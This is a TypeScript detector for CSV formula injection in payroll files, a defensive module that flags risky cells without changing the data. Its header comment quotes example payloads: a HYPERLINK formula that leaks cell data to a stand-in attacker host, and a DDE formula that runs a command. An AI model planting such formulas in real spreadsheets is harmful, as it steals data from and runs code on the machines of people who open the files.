// CSV / formula injection detector.
//
// When a TPA opens a payroll CSV in Excel, Numbers, or Google Sheets, any
// cell that begins with =, +, -, @, \t, or \r is interpreted as a formula.
// An attacker who can land an entry in a payroll system can stage payloads
// like:
//
//     =HYPERLINK("http://evil.example/?"&A1,"click me")
//     =cmd|'/c calc'!A1            # WebQuery / DDE in older Excel
//     +SUM(...)                    # Excel still treats + as a formula prefix
//
// We don't sanitize the data — that would silently mutate payroll records,
// which violates the normalization invariant ("Never silently alter source
// data"). Instead we surface every offending cell as a per-row issue so the
// operator can investigate and either correct the source or document the
// false positive.
//
// Scope: only checks columns that came from the user's mapping (i.e. ones
// we treat as canonical fields). Unmapped extra columns in the source file
// are not relayed to recordkeepers and don't pose a risk.

import type { IssueDraft } from "@/lib/validation/types";

// Per OWASP / CWE-1236, these characters at the start of a cell make it
// formula-evaluable in mainstream spreadsheet apps. Whitespace at the start
// is trimmed by parsers we use, but tab and CR remain risky in raw cells.
const RISK_PREFIXES = new Set(["=", "+", "-", "@", "\t", "\r"]);

export type InjectionScanInput = {
  rows: Record<string, string>[];
  mapping: Record<string, string>; // canonical key -> source header
};

// Returns one IssueDraft per offending cell. severity = "warning" by default.
// Operators can promote to blocking via a custom validator if their threat
// model demands it.
export function detectCsvInjection(input: InjectionScanInput): IssueDraft[] {
  const issues: IssueDraft[] = [];
  const mappedHeaders = Object.values(input.mapping);

  input.rows.forEach((row, rowIndex) => {
    for (const header of mappedHeaders) {
      const raw = row[header];
      if (typeof raw !== "string" || raw.length === 0) continue;
      // We check the raw value, not a trimmed view — Excel respects leading
      // whitespace differently across versions, and a leading tab itself is
      // a known DDE-injection vector.
      const first = raw[0]!;
      if (!RISK_PREFIXES.has(first)) continue;
      issues.push({
        ruleKey: "data_quality.csv_injection_risk",
        severity: "warning",
        category: "data_quality",
        entityType: "contribution_row",
        entityId: String(rowIndex),
        message: `Row ${rowIndex} column "${header}" starts with a spreadsheet-formula character (${describeChar(first)}). May execute when opened in Excel/Sheets/Numbers.`,
        recommendedResolution:
          "Verify the source data; correct the upstream record or document the false positive before approval.",
        sourceField: header,
        actualValue: raw.length > 64 ? `${raw.slice(0, 64)}…` : raw,
      });
    }
  });

  return issues;
}

function describeChar(c: string): string {
  if (c === "\t") return "tab";
  if (c === "\r") return "carriage return";
  return `"${c}"`;
}
